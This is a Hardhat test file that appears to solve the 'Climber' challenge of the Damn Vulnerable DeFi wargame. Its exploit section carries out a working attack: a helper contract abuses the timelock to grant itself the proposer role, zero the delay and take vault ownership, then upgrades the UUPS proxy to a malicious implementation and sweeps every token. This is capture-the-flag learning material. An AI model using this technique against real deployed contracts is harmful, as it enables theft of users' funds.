const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Climber', function () {
    let deployer, proposer, sweeper, attacker;

    // Vault starts with 10 million tokens
    const VAULT_TOKEN_BALANCE = ethers.utils.parseEther('10000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, proposer, sweeper, attacker] = await ethers.getSigners();

        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x16345785d8a0000", // 0.1 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('0.1'));
        
        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        this.vault = await upgrades.deployProxy(
            await ethers.getContractFactory('ClimberVault', deployer),
            [ deployer.address, proposer.address, sweeper.address ],
            { kind: 'uups' }
        );

        expect(await this.vault.getSweeper()).to.eq(sweeper.address);
        expect(await this.vault.getLastWithdrawalTimestamp()).to.be.gt('0');
        expect(await this.vault.owner()).to.not.eq(ethers.constants.AddressZero);
        expect(await this.vault.owner()).to.not.eq(deployer.address);
        
        // Instantiate timelock
        let timelockAddress = await this.vault.owner();
        this.timelock = await (
            await ethers.getContractFactory('ClimberTimelock', deployer)
        ).attach(timelockAddress);
        
        // Ensure timelock roles are correctly initialized
        expect(
            await this.timelock.hasRole(await this.timelock.PROPOSER_ROLE(), proposer.address)
        ).to.be.true;
        expect(
            await this.timelock.hasRole(await this.timelock.ADMIN_ROLE(), deployer.address)
        ).to.be.true;

        // Deploy token and transfer initial token balance to the vault
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        await this.token.transfer(this.vault.address, VAULT_TOKEN_BALANCE);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */

        // Connect as the attacker
        this.token = this.token.connect(attacker);
        this.vault = this.vault.connect(attacker);
        this.timelock = this.timelock.connect(attacker);

        // Initial token balance of contract and of attacker
        let contract_token_balance = await this.token.balanceOf(this.vault.address);
        let attacker_token_balance = await this.token.balanceOf(attacker.address);

        console.log("[contract] initial token balance: " + contract_token_balance / 1e18);
        console.log("[attacker] initial token balance: " + attacker_token_balance / 1e18);

        // 1. Deploy contract that handles scheduling and executing the calls.
        this.timelock_exploit = await (
            await ethers.getContractFactory('TimelockExploit', attacker)).
            deploy(this.timelock.address,this.vault.address);
        
        // 1.1. trigger timelock's exploit
        /*
            This will: 
            1. remove the delay for waiting on "timelocked" timelock calls
            2. grant us proposer role so that we can schedule tasks
            3. trigger the scheduling of those malicious calls
            4. transfer the ownership of the vulnerable vault so that we can upgrade it.
        */
        await this.timelock_exploit.trigger_exploit();

        // 2. Construct malicious vault. DON'T FKING DEPLOY IT DUUUUUUUDE :cry:
        this.malicious_vault = await ethers.getContractFactory('VaultExploit', attacker);

        // 3. Upgrade current vault to the malicious vault.
        // https://github.com/OpenZeppelin/openzeppelin-upgrades Follow this to use OpenZeppelin `upgrades`
        const upgraded_vault = await upgrades.upgradeProxy(
            this.vault.address,
            this.malicious_vault
        );

        // 4. Sweep all the funds through the malicious vault.
        await upgraded_vault.sweepFunds(this.token.address);

        // Final token balance of contract and of attacker
        contract_token_balance = await this.token.balanceOf(this.vault.address);
        attacker_token_balance = await this.token.balanceOf(attacker.address);

        console.log("[contract] final token balance: " + contract_token_balance / 1e18);
        console.log("[attacker] final token balance: " + attacker_token_balance / 1e18);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(await this.token.balanceOf(this.vault.address)).to.eq('0');
        expect(await this.token.balanceOf(attacker.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
